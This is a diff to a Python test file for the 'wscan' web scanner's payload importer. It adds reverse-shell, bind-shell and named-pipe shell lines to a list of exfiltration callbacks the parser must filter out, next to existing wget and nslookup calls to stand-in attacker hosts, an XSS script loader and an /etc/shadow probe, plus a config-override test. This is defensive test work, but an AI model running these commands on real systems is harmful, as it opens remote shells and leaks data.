@@ -1,7 +1,8 @@
 import yaml
 
+import wscan.engine as engine_mod
 from wscan import payload_importer
-from wscan.engine import merge_community_payloads
+from wscan.engine import ScanEngine, merge_community_payloads
 from wscan.payload_importer import build_corpus, parse_payload_lines, write_yaml
 
 
@@ -66,6 +67,10 @@ def test_parse_payload_lines_filters_exfiltration_callbacks_always():
             "; wget http://evil.example/$(id)",
             "nslookup `whoami`.attacker.example",
             "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+            "; nc -lvvp 4444 -e /bin/sh;",      # バインドシェル
+            "& ncat 10.0.0.1 4444 -e /bin/bash",  # リバースシェル
+            "; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i",  # 名前付きパイプ shell
+            'echo "use Socket;socket(S,PF_INET,SOCK_STREAM,...)"',  # perl reverse shell
             "<svg onload=document.body.appendChild(document.createElement('script')).src='//evil/x'>",
             "../../../../etc/shadow",          # ローカル読取プローブ → 保持
             "; id",                            # 通常の検出プローブ → 保持
@@ -161,3 +166,26 @@ def test_merge_interleaves_so_community_survives_generator_cap():
     assert merged[2] == "community0"
     # 重複なし・全件保持
     assert len(merged) == len(set(merged)) == 120
+
+
+def test_explicit_flag_overrides_config_false(monkeypatch):
+    # config が false でも、明示的に渡した True/False が単一の真実として優先される
+    # （CLI/API の --community-payloads / --payload-evolution が握り潰されない）。
+    monkeypatch.setattr(engine_mod, "_community_payloads_enabled_by_config", lambda *a, **k: False)
+    monkeypatch.setattr(engine_mod, "_payload_evolution_enabled_by_config", lambda *a, **k: False)
+
+    explicit = ScanEngine(
+        "http://127.0.0.1:9/", checks=["xss"], llm_provider="none",
+        headless=True, open_report=False,
+        enable_community_payloads=True, enable_payload_evolution=True,
+    )
+    assert explicit.enable_community_payloads is True
+    assert explicit.enable_payload_evolution is True
+
+    # 未指定(None)のときだけ config を既定として読む
+    default = ScanEngine(
+        "http://127.0.0.1:9/", checks=["xss"], llm_provider="none",
+        headless=True, open_report=False,
+    )
+    assert default.enable_community_payloads is False
+    assert default.enable_payload_evolution is False
